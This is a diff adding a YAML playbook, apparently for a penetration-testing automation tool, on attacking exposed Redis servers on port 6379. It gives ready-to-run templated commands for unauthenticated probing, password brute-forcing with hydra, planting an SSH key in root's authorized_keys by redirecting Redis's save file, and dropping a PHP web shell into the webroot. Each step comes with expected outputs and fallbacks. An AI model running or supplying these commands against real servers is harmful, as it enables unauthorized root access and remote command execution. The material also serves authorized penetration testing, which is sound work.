@@ -1,0 +1,59 @@
+id: redis
+name: Redis In-Memory Database Exploitation (Port 6379)
+category: network
+description: Methodology for unauthenticated and authenticated Redis servers on port 6379. Covers SSH key injection, Web shell drops, and Cron job reverse shell execution.
+port_triggers:
+  - 6379
+service_triggers:
+  - redis
+tags:
+  - redis
+  - database
+  - rce
+  - ssh-injection
+steps:
+  - id: redis-ping-info
+    title: Redis Unauthenticated Probe & Server Info
+    phase: reconnaissance
+    purpose: Test if Redis allows unauthenticated connections and retrieve operating system, redis_version, and database keys.
+    command: redis-cli -h {{TARGET}} info
+    expected_output:
+      - '# Server'
+      - redis_version:5.0.7
+      - os:Linux 5.4.0-42-generic x86_64
+    common_mistakes:
+      - If `NOAUTH Authentication required`, test common passwords from wordlist with `AUTH <password>`.
+    if_success: Unauthenticated Redis access! Proceed to SSH authorized_keys injection or web shell drop.
+    if_failure: Password required. Try `hydra -P rockyou.txt redis://{{TARGET}}`.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
+  - id: redis-ssh-inject
+    title: SSH Authorized Keys Injection via Redis
+    phase: exploitation
+    purpose: Write your public SSH key into `/root/.ssh/authorized_keys` or `/home/user/.ssh/authorized_keys` using Redis database save commands.
+    command: (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt && redis-cli -h {{TARGET}} -x set ssh_key < foo.txt && redis-cli -h {{TARGET}} config set dir /root/.ssh/ && redis-cli -h {{TARGET}} config set dbfilename authorized_keys && redis-cli -h {{TARGET}} save
+    expected_output:
+      - OK
+      - OK
+      - OK
+    common_mistakes:
+      - Target must be running Redis as `root` or target user, and target user must allow SSH passwordless key login.
+    if_success: SSH key written! Log in with `ssh root@{{TARGET}}`.
+    if_failure: Permission denied on `/root/.ssh/`. Try web directory `/var/www/html/` for PHP webshell drop.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
+  - id: redis-webshell-drop
+    title: Web Shell Drop into Webroot via Redis
+    phase: exploitation
+    purpose: If port 80/443 is running PHP, write a PHP web shell into `/var/www/html/` via Redis config.
+    command: redis-cli -h {{TARGET}} config set dir /var/www/html/ && redis-cli -h {{TARGET}} config set dbfilename shell.php && redis-cli -h {{TARGET}} set test "<?php system(\$_GET['cmd']); ?>" && redis-cli -h {{TARGET}} save
+    expected_output:
+      - OK
+      - OK
+      - OK
+    common_mistakes:
+      - Webroot might be in custom folder like `/var/www/wordpress/` or `/opt/app/public/`.
+    if_success: 'Web shell written! Execute commands: `curl "{{TARGET_URL}}/shell.php?cmd=id"`.'
+    if_failure: Permission denied writing to `/var/www/html/`. Try cron job reverse shell.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
